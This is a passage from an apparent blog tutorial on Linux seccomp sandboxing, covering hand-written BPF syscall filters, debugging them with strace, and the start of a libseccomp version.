</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/seccomp.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stddef.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/prctl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/syscall.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// This is a buffer that we will read into.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_filter filter[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Load architecture into accumulator register. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_LD <span style="color:#f92672">|</span> BPF_W <span style="color:#f92672">|</span> BPF_ABS, (<span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">struct</span> seccomp_data, arch))),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Check if the architecture is x86_64. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_JUMP</span>(BPF_JMP <span style="color:#f92672">|</span> BPF_JEQ <span style="color:#f92672">|</span> BPF_K, AUDIT_ARCH_X86_64, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Kill the process if architecture does not match*/</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_RET <span style="color:#f92672">|</span> BPF_K, SECCOMP_RET_KILL),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Load the system call number. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_LD <span style="color:#f92672">|</span> BPF_W <span style="color:#f92672">|</span> BPF_ABS, (<span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">struct</span> seccomp_data, nr))),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Check if the system call is `read`. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_JUMP</span>(BPF_JMP <span style="color:#f92672">|</span> BPF_JEQ <span style="color:#f92672">|</span> BPF_K, __NR_read, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Allow the system call. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_RET <span style="color:#f92672">|</span> BPF_K, SECCOMP_RET_ALLOW),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Kill the process. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_RET <span style="color:#f92672">|</span> BPF_K, SECCOMP_RET_KILL),
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_fprog prog <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        .len <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>)(<span style="color:#66d9ef">sizeof</span>(filter) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(filter[<span style="color:#ae81ff">0</span>])),
</span></span><span style="display:flex;"><span>        .filter <span style="color:#f92672">=</span> filter,
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">prctl</span>(PR_SET_NO_NEW_PRIVS, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;prctl(PR_SET_NO_NEW_PRIVS) failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">prctl</span>(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, <span style="color:#f92672">&amp;</span>prog) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;prctl(PR_SET_SECCOMP) failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// after read this program will fail...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Before executing let’s break down previous code and see what it does. First we create a BPF program. The BPF program is an array of <code>struct sock_filter</code> structures. Each struct sock_filter structure contains a BPF instruction.</p>
<p>In order to write the program in an “high level representation” we use some macros available in the <code>linux/filter.h</code> header file. The <code>BPF_STMT</code> macro is used to create a <code>struct sock_filter</code> structure from a BPF instruction which represents a statement, in this case a load operation. The <code>BPF_JUMP</code> macro is used to create a <code>struct sock_filter</code> structure from BPF instruction which represents a jump.</p>
<p>For example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">BPF_STMT</span>(BPF_LD <span style="color:#f92672">|</span> BPF_W <span style="color:#f92672">|</span> BPF_ABS, (<span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">struct</span> seccomp_data, arch))),
</span></span></code></pre></div><p>This instruction loads the architecture of the system call into the accumulator register. The <code>BPF_LD</code> macro is used to specify that this is a load operation. The <code>BPF_W</code> macro is used to specify that the load operation is a 32-bit load operation. The <code>BPF_ABS</code> macro is used to specify that the load operation is an absolute load operation. The <code>offsetof(struct seccomp_data, arch)</code> macro is used to specify the offset of the arch field of the <code>struct seccomp_data</code> structure.</p>
<p>A <code>struct sock_filter</code> structure contains the following fields:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> sock_filter {
</span></span><span style="display:flex;"><span>    __u16 code;     <span style="color:#75715e">/* Actual filter code */</span>
</span></span><span style="display:flex;"><span>    __u8 jt;        <span style="color:#75715e">/* Jump true */</span>
</span></span><span style="display:flex;"><span>    __u8 jf;        <span style="color:#75715e">/* Jump false */</span>
</span></span><span style="display:flex;"><span>    __u32 k;        <span style="color:#75715e">/* Generic multiuse field */</span>
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>If we should translate the <code>sock_filter[]</code> array above to BPF instructions it would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ld [<span style="color:#ae81ff">4</span>]                      <span style="color:#960050;background-color:#1e0010">#</span> Load the architecture of the system call into the accumulator <span style="color:#66d9ef">register</span>.
</span></span><span style="display:flex;"><span>jeq <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xc000003e</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>       <span style="color:#960050;background-color:#1e0010">#</span> Check <span style="color:#66d9ef">if</span> the architecture is x86_64.
</span></span><span style="display:flex;"><span>ret <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x00000000</span>             <span style="color:#960050;background-color:#1e0010">#</span> Kill the process <span style="color:#66d9ef">if</span> architecture does not match.
</span></span><span style="display:flex;"><span>ld [<span style="color:#ae81ff">0</span>]                      <span style="color:#960050;background-color:#1e0010">#</span> Load the system call number.
</span></span><span style="display:flex;"><span>jeq <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x00000000</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>       <span style="color:#960050;background-color:#1e0010">#</span> Check <span style="color:#66d9ef">if</span> the system call is <span style="color:#960050;background-color:#1e0010">`</span>read<span style="color:#960050;background-color:#1e0010">`</span>.
</span></span><span style="display:flex;"><span>ret <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x7fff0000</span>             <span style="color:#960050;background-color:#1e0010">#</span> Allow the system call.
</span></span><span style="display:flex;"><span>ret <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x00000000</span>             <span style="color:#960050;background-color:#1e0010">#</span> Kill the process.
</span></span></code></pre></div><p>After we created the <code>sock_filter[]</code> array we create a <code>struct sock_fprog</code> structure. The <code>struct sock_fprog</code> structure contains the following fields:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> sock_fprog {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> len;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_filter <span style="color:#f92672">*</span>filter;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>The <code>len</code> field contains the number of BPF instructions in the <code>filter</code> field. The <code>filter</code> field contains a pointer to the BPF instructions.</p>
<p>We then invoke a <code>prctl(2)</code> syscall to set the <code>NO_NEW_PRIVS</code> flag. The <code>NO_NEW_PRIVS</code> flag prevents the process from gaining new privileges. Then with another <code>prctl(2)</code> syscall we set the seccomp filter. The <code>SECCOMP_MODE_FILTER</code> flag specifies that we want to set a seccomp filter. The &amp;prog argument specifies the BPF program that we want to use.</p>
<p>Since we allowed the <code>read(2)</code> syscall we try to use it just after we set the seccomp filter. Then if you read the code above carefully I’ve left a comment telling that the program will fail to return 0 just after the read syscall.</p>
<p>Let’s see what happens, first we compile the program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> gcc <span style="color:#f92672">-</span>o example_1 example_1.c
</span></span></code></pre></div><p>Then we run it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.<span style="color:#f92672">/</span>example_1
</span></span><span style="display:flex;"><span>aaaa
</span></span><span style="display:flex;"><span>fish: Job <span style="color:#ae81ff">1</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span>.<span style="color:#f92672">/</span>example_1<span style="color:#960050;background-color:#1e0010">&#39;</span> terminated by signal <span style="color:#a6e22e">SIGSYS</span> (Bad system call)
</span></span></code></pre></div><p>As you can see the program failed with a <code>SIGSYS</code> signal. Despite we were able to read 4 bytes from the standard input the program failed. Lets <code>strace</code> the program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...snip...
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">prctl</span>(PR_SET_NO_NEW_PRIVS, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">prctl</span>(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span>, filter<span style="color:#f92672">=</span><span style="color:#ae81ff">0x7fffd3c68b40</span>}) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, aaaa
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;aaa&#34;</span>, <span style="color:#ae81ff">3</span>)                       <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exit_group</span>(<span style="color:#ae81ff">0</span>)                           <span style="color:#f92672">=</span> <span style="color:#ae81ff">231</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> killed by <span style="color:#a6e22e">SIGSYS</span> (core dumped) <span style="color:#f92672">+++</span>
</span></span><span style="display:flex;"><span>fish: Job <span style="color:#ae81ff">1</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span>strace .<span style="color:#f92672">/</span>example_1<span style="color:#960050;background-color:#1e0010">&#39;</span> terminated by signal <span style="color:#a6e22e">SIGSYS</span> (Bad system call)
</span></span></code></pre></div><p>It seems our program is failing right after the <code>read(2)</code> syscall. That’s because our BPF program allows just the <code>read(2)</code>syscall, but of course a program to terminate itself needs to call <code>exit_group(2)</code> syscall. So we need to allow the <code>exit_group(2)</code> syscall too. Let’s modify our BPF program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/filter.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/seccomp.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stddef.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/prctl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/syscall.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_filter filter[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Load architecture. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_LD <span style="color:#f92672">|</span> BPF_W <span style="color:#f92672">|</span> BPF_ABS, (<span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">struct</span> seccomp_data, arch))),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Check if architecture is x86_64. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_JUMP</span>(BPF_JMP <span style="color:#f92672">|</span> BPF_JEQ <span style="color:#f92672">|</span> BPF_K, AUDIT_ARCH_X86_64, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Kill the process if architecture does not match. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_RET <span style="color:#f92672">|</span> BPF_K, SECCOMP_RET_KILL),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Load system call number. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_LD <span style="color:#f92672">|</span> BPF_W <span style="color:#f92672">|</span> BPF_ABS, (<span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">struct</span> seccomp_data, nr))),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Check if system call is read. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_JUMP</span>(BPF_JMP <span style="color:#f92672">|</span> BPF_JEQ <span style="color:#f92672">|</span> BPF_K, __NR_read, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Allow the system call. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_RET <span style="color:#f92672">|</span> BPF_K, SECCOMP_RET_ALLOW),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Check if system call is exit_group. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_JUMP</span>(BPF_JMP <span style="color:#f92672">|</span> BPF_JEQ <span style="color:#f92672">|</span> BPF_K, __NR_exit_group, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Allow the system call. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_RET <span style="color:#f92672">|</span> BPF_K, SECCOMP_RET_ALLOW),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Kill the process. */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BPF_STMT</span>(BPF_RET <span style="color:#f92672">|</span> BPF_K, SECCOMP_RET_KILL),
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_fprog prog <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        .len <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>)(<span style="color:#66d9ef">sizeof</span>(filter) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(filter[<span style="color:#ae81ff">0</span>])),
</span></span><span style="display:flex;"><span>        .filter <span style="color:#f92672">=</span> filter,
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">prctl</span>(PR_SET_NO_NEW_PRIVS, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;prctl(PR_SET_NO_NEW_PRIVS) failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">prctl</span>(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, <span style="color:#f92672">&amp;</span>prog) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;prctl(PR_SET_SECCOMP) failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now if we strace again our program we can see that it is able to read 4 bytes from the standard input and then it terminates correctly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...snip...
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">prctl</span>(PR_SET_NO_NEW_PRIVS, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">prctl</span>(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len<span style="color:#f92672">=</span><span style="color:#ae81ff">9</span>, filter<span style="color:#f92672">=</span><span style="color:#ae81ff">0x7ffe48c7a070</span>}) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, aaaa
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;aaaa&#34;</span>, <span style="color:#ae81ff">4</span>)                      <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exit_group</span>(<span style="color:#ae81ff">0</span>)                           <span style="color:#f92672">=</span> <span style="color:#f92672">?</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> exited with <span style="color:#ae81ff">0</span> <span style="color:#f92672">+++</span>
</span></span></code></pre></div><p>So here’s a quicktip, man pages for <code>seccomp(2)</code> suggest to define a white lists of syscalls instead of a black list. This is because a black list can be easily miss some syscalls and this can lead to a security issue. So if you want to use a seccomp filter I suggest to use a white list instead of a black list. Of course to use a white list you need to know all the syscalls that you need to allow. This is not always easy, but if you are writing a program that needs to use a seccomp filter you could use strace to find out all the syscalls that your program needs to use.</p>
<p>For example the following <code>strace</code> command can be used to find out all the syscalls that the <code>ls</code> command needs to use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strace -c ls
</span></span><span style="display:flex;"><span>...snip...
</span></span><span style="display:flex;"><span>% time     seconds  usecs/call     calls    errors syscall
</span></span><span style="display:flex;"><span>------ ----------- ----------- --------- --------- ----------------
</span></span><span style="display:flex;"><span> 22.82    0.000034           <span style="color:#ae81ff">1</span>        <span style="color:#ae81ff">22</span>           mmap
</span></span><span style="display:flex;"><span> 13.42    0.000020           <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">8</span>           mprotect
</span></span><span style="display:flex;"><span> 10.07    0.000015           <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">7</span>           openat
</span></span><span style="display:flex;"><span>  6.71    0.000010           <span style="color:#ae81ff">5</span>         <span style="color:#ae81ff">2</span>           getdents64
</span></span><span style="display:flex;"><span>  6.04    0.000009           <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">9</span>           close
</span></span><span style="display:flex;"><span>  6.04    0.000009           <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">8</span>           newfstatat
</span></span><span style="display:flex;"><span>  4.70    0.000007           <span style="color:#ae81ff">7</span>         <span style="color:#ae81ff">1</span>           munmap
</span></span><span style="display:flex;"><span>  4.70    0.000007           <span style="color:#ae81ff">3</span>         <span style="color:#ae81ff">2</span>           statfs
</span></span><span style="display:flex;"><span>  4.70    0.000007           <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">6</span>         <span style="color:#ae81ff">4</span> prctl
</span></span><span style="display:flex;"><span>  2.68    0.000004           <span style="color:#ae81ff">4</span>         <span style="color:#ae81ff">1</span>           write
</span></span><span style="display:flex;"><span>  2.68    0.000004           <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">3</span>           brk
</span></span><span style="display:flex;"><span>  2.68    0.000004           <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">2</span>           ioctl
</span></span><span style="display:flex;"><span>  2.01    0.000003           <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">2</span>           pread64
</span></span><span style="display:flex;"><span>  2.01    0.000003           <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">1</span> access
</span></span><span style="display:flex;"><span>  1.34    0.000002           <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">4</span>           read
</span></span><span style="display:flex;"><span>  1.34    0.000002           <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">1</span> arch_prctl
</span></span><span style="display:flex;"><span>  1.34    0.000002           <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">1</span>           set_tid_address
</span></span><span style="display:flex;"><span>  1.34    0.000002           <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">1</span>           set_robust_list
</span></span><span style="display:flex;"><span>  1.34    0.000002           <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">1</span>           prlimit64
</span></span><span style="display:flex;"><span>  1.34    0.000002           <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">1</span>           rseq
</span></span><span style="display:flex;"><span>  0.67    0.000001           <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">1</span>           getrandom
</span></span><span style="display:flex;"><span>  0.00    0.000000           <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">1</span>           execve
</span></span><span style="display:flex;"><span>------ ----------- ----------- --------- --------- ----------------
</span></span><span style="display:flex;"><span>100.00    0.000149           <span style="color:#ae81ff">1</span>        <span style="color:#ae81ff">87</span>         <span style="color:#ae81ff">6</span> total
</span></span></code></pre></div><p>Of course while analyzing the output of <code>strace</code> you need to take into account that some syscalls are used by dynamic loader.Since the dynamic loader at some point passes the control to the main of your program you should allow just syscalls that your program makes use after the seccomp filter is set.</p>
<h2 id="using-libseccomp">Using libseccomp</h2>
<p>You may have noticed that the code of the previous example is quite verbose. To make the code more readable and to avoid some errors you can use the <code>libseccomp</code> library. The <code>libseccomp</code> library provides a high level API to set a seccomp filter. The following example is the same as the previous one but it uses the <code>libseccomp</code> library:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;seccomp.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/prctl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    scmp_filter_ctx ctx;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// set no_new_privs
